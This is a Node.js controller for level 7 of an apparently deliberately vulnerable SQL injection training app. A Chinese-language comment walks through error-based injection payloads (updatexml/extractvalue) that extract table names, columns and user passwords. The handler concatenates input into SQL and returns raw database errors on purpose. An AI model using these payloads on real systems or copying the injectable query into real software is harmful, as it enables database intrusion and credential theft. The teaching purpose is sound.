const db = require('../../config/db');

/*
报错注入 (Error-Based Injection) 解题思路：

1. 报错注入利用数据库的错误消息中包含查询结果的特性来获取数据
2. 该技术在错误信息会返回给用户的情况下非常有效

3. 解题步骤：
   a. 构造能够触发特定错误的SQL语句，同时在错误消息中包含我们想要的数据:
      ' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -
      ' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
      
   b. 获取表名:
      ' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e))-- -
      
   c. 获取列名:
      ' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x7e))-- -
      
   d. 提取数据:
      ' AND extractvalue(1,concat(0x7e,(SELECT concat(username,':',password) FROM users LIMIT 0,1),0x7e))-- -
      
4. 每次查询只能提取有限的数据，需要多次查询并使用LIMIT子句获取更多结果

5. 成功的注入语句示例:
   ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e))-- -
*/

// 渲染SQL注入Level 7页面
exports.renderPage = (req, res) => {
  res.render('sqli/level7', {
    title: 'SQL注入 - Level 7 (报错注入)',
    activeMenu: 'sqli',
    result: null,
    error: null,
    query: ''
  });
};

// 处理SQL注入Level 7查询
exports.processQuery = async (req, res) => {
  const { product } = req.body;
  let result = null;
  let error = null;
  
  try {
    // 不安全的查询 - 直接拼接用户输入
    const sql = `SELECT * FROM articles WHERE title LIKE '%${product}%'`;
    
    // 尝试执行查询
    const pool = db.getPool();
    if (!pool) {
      throw new Error('数据库未连接');
    }
    
    const [rows] = await pool.execute(sql);
    result = rows;
  } catch (err) {
    console.error('SQL注入Level 7查询错误:', err);
    // 在这里我们故意将错误消息返回给用户，这可能泄露敏感信息
    error = err.message;
  }
  
  res.render('sqli/level7', {
    title: 'SQL注入 - Level 7 (报错注入)',
    activeMenu: 'sqli',
    result,
    error,
    query: product
  });
}; 